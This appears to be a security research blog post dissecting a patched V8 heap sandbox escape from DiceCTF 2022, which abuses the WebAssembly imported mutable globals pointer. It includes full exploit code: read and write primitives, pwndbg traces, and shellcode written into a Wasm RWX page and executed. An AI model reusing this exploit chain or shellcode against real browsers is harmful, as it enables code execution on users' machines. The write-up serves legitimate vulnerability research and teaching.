+++
tags = ["browser","v8","chromium"]
categories = ["Web Browsers", "Javascript Engines", "Chromium"]
description = "In anticipation of the future implementation of CFI on `code_entry_point` fields within function objects, I wanted to explore some patched sandbox escapes that have been found in the past."
date = "2023-01-08"
featuredpath = "date"
linktitle = ""
title = "Exploring Historical V8 Heap Sandbox Escapes I"
slug = "exploring-historical-v8-heap-sandbox-escapes-i"
type = "post"
+++

## Motivation

In anticipation of the future implementation of CFI on `code_entry_point` fields within function objects (the vector by which most publicly known heap sandbox escapes currently occur), I wanted to explore some patched sandbox escapes that have been found in the past.

In this post I'll be looking at the following patch: [\[sandbox\] Remove a number of native allocations from WasmInstanceObject](https://chromium-review.googlesource.com/c/v8/v8/+/3845636).


## Overview

The heap sandbox escape I'll be looking into today was originally found during DiceCTF 2022. The blog post detailing this technique can be found [here](https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/).

In practice it's pretty simple, involving corrupting memory within a WebAssembly instance object. Specifically the pointer to the instance's mutable globals store, allowing us to read or write arbitrary memory via global variables. 

This was due to WebAssembly storing globals data in a location external to the heap sandbox (meaning that it was an un-sandboxed external pointer). The patch for it just involved moving this data store to the heap itself.


## Enabling the Memory Corruption API

Before building, I thought it best to enable the memory corruption API rather than implement a vulnerability into V8 itself.

The memory corruption API implements several functions that makes manipulating memory within the heap sandbox a lot easier.

```diff
diff --git a/BUILD.gn b/BUILD.gn
index af24f4309a..5ca4c0666a 100644
--- a/BUILD.gn
+++ b/BUILD.gn
@@ -305,7 +305,7 @@ declare_args() {
 
   # Enable the experimental V8 sandbox.
   # Sets -DV8_ENABLE_SANDBOX.
-  v8_enable_sandbox = ""
+  v8_enable_sandbox = true
 
   # Enable sandboxing for all external pointers. Requires v8_enable_sandbox.
   # Sets -DV8_SANDBOXED_EXTERNAL_POINTERS.
@@ -317,7 +317,7 @@ declare_args() {
   # Expose the memory corruption API to JavaScript. Useful for testing the sandbox.
   # WARNING This will expose builtins that (by design) cause memory corruption.
   # Sets -DV8_EXPOSE_MEMORY_CORRUPTION_API
-  v8_expose_memory_corruption_api = false
+  v8_expose_memory_corruption_api = true
 
   # Experimental feature for collecting per-class zone memory stats.
   # Requires use_rtti = true
```

For this particular heap sandbox escape, we'll need to build out some typical exploit primitives. I won't go into much detail here, but you can find the relevant code below.

```js
let buf = new ArrayBuffer(8);
let f64 = new Float64Array(buf);
let u64 = new BigUint64Array(buf);
let i64 = new BigInt64Array(buf);

const utof = x => {
  u64[0] = x;
  return f64[0];
};

const itou = x => {
  i64[0] = x;
  return u64[0];
};

const hex = x => {
  return `0x${x.toString(16)}`; 
};

const addrof = o => {
  return Sandbox.getAddressOf(o);
};

const weak_read = p => {
  let reader = new Sandbox.MemoryView(p, 64);
  let view = new DataView(reader);
  return view.getBigUint64(0, true); 
};

const weak_write = (p, x) => {
  let writer = new Sandbox.MemoryView(p, 64);
  let view = new DataView(writer);
  view.setBigUint64(0, x, true);
};
```

## WebAssembly Mutable Globals 

```
DebugPrint: 0x237001d4521: [WasmInstanceObject] in OldSpace
 - map: 0x023700207891 <Map[256](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x0237000486f1 <Object map = 0x23700208151>
 - elements: 0x023700002251 <FixedArray[0]> [HOLEY_ELEMENTS]
...
 - imported_mutable_globals: 0x561312e4e250
...
```

```wat
(module
  (global $g (import "js" "global") (mut i32))
  (func (export "getGlobal") (result i32)
    (global.get $g)
  )
  (func (export "incGlobal")
    (global.set $g (i32.add (global.get $g) (i32.const 1)))
  )
)
```

```js
const global = new WebAssembly.Global({ value: "i32", mutable: true }, 0);

let wasm = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 96, 0, 1, 127, 96, 0, 0, 2, 14, 1,
  2, 106, 115, 6, 103, 108, 111, 98, 97, 108, 3, 127, 1, 3, 3, 2, 0, 1, 7,
  25, 2, 9, 103, 101, 116, 71, 108, 111, 98, 97, 108, 0, 0, 9, 105, 110, 99,
  71, 108, 111, 98, 97, 108, 0, 1, 10, 16, 2, 4, 0, 35, 0, 11, 9, 0, 35, 0,
  65, 1, 106, 36, 0, 11
]);
let module = new WebAssembly.Module(wasm);
let instance = new WebAssembly.Instance(module, {
  js: { global }
});

console.log(instance.exports.getGlobal()); // 0
instance.exports.incGlobal();
console.log(instance.exports.getGlobal()); // 1
```


## Corrupting the Imported Mutable Globals Pointer

```js
%DebugPrint(instance);
%SystemBreak();

instance.exports.incGlobal();
%SystemBreak();
```

```
DebugPrint: 0x1f84001d4659: [WasmInstanceObject] in OldSpace
 - map: 0x1f8400207891 <Map[256](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x1f8400048709 <Object map = 0x1f8400208241>
 - elements: 0x1f8400002251 <FixedArray[0]> [HOLEY_ELEMENTS]
...
 - imported_mutable_globals: 0x55afdf05e3e0
...
```

```
pwndbg> x/gx 0x55afdf05e3e0
0x55afdf05e3e0:	0x00001f8500001000
pwndbg> x/gx 0x00001f8500001000
0x1f8500001000:	0x0000000000000000
pwndbg> c
Continuing.

pwndbg> x/gx 0x00001f8500001000
0x1f8500001000:	0x0000000000000001
```

```
pwndbg> set *(uint64_t *)(0x56394c0dc3d0) = 0x4141414141414141
pwndbg> x/gx 0x56394c0dc3d0
0x56394c0dc3d0:	0x4141414141414141
pwndbg> c
Continuing.

Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
```

```
 ► 0x2d0f6f7876a2    mov    ecx, dword ptr [rax]
   0x2d0f6f7876a4    add    ecx, 1
   0x2d0f6f7876a7    mov    rax, qword ptr [rsi + 0x57]
   0x2d0f6f7876ab    mov    rax, qword ptr [rax]
   0x2d0f6f7876ae    mov    dword ptr [rax], ecx
```

```
pwndbg> p/x $rax
$1 = 0x4141414141414141
```


## An Arbitrary Read Primitive

```
(module
  (global $g (import "js" "global") (mut i64))
  (func (export "read") (result i64)
    (global.get $g)
  )
)
```

```js
const global = new WebAssembly.Global({ value: "i64", mutable: true }, 0n);

let wasm = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 126, 2, 14, 1, 2, 106,
  115, 6, 103, 108, 111, 98, 97, 108, 3, 126, 1, 3, 2, 1, 0, 7, 8, 1, 4,
  114, 101, 97, 100, 0, 0, 10, 6, 1, 4, 0, 35, 0, 11
]);
let module = new WebAssembly.Module(wasm);
let instance = new WebAssembly.Instance(module, {
  js: { global }
});

let heap = (weak_read(0x18) >> 32n) << 32n;
let store = [1.1];
let elements = heap + (weak_read(addrof(store) + 0x8) & 0xffffffffn);
weak_write(addrof(instance) + 0x58, elements + 8n - 1n);

store[0] = utof(0xdeadbeefn);
instance.exports.read();
```

```
Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
...
 ► 0x2e60bc29c662    mov    rcx, qword ptr [rax]
...
pwndbg> p/x $rax
$1 = 0xdeadbeef
```

```js
const strong_read = p => {
  store[0] = utof(p);
  return itou(instance.exports.read());
};
```


## An Arbitrary Write Primitive

```
(module
  (global $g (import "js" "global") (mut i64))
  (func (export "read") (result i64)
    (global.get $g)
  )
  (func (export "write") (param $p i64)
    (global.set $g (local.get $p))
  )
)
```

```js
const strong_write = (p, x) => {
  store[0] = utof(p);
  instance.exports.write(x);
};
```


## Code Execution

```js
let _wasm = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
  130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
  128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128,
  0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10,
  138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11
]);
let _module = new WebAssembly.Module(_wasm);
let _instance = new WebAssembly.Instance(_module);

let rwx = weak_read(addrof(_instance) + 0x68); 

let shellcode = [
  0x732f6e69622fb848n,
  0x66525f5450990068n,
  0x15e8525e54632d68n,
  0x4c50534944000000n,
  0x302e303a273d5941n,
  0x00636c6163782027n,
  0x0f583b6a5e545756n,
  0x0000000000000005n
];
for (let i = 0; i < shellcode.length; i++)
  strong_write(rwx + (8n * BigInt(i)), shellcode[i]);

_instance.exports.main();
```


## References
 - [\[sandbox\] Remove a number of native allocations from WasmInstanceObject](https://chromium-review.googlesource.com/c/v8/v8/+/3845636)
 - [DiceCTF 2022 - Memory Hole | kylebot's Blog](https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/)
 - [WebAssembly.Global() constructor - WebAssembly | MDN](https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Global/Global)
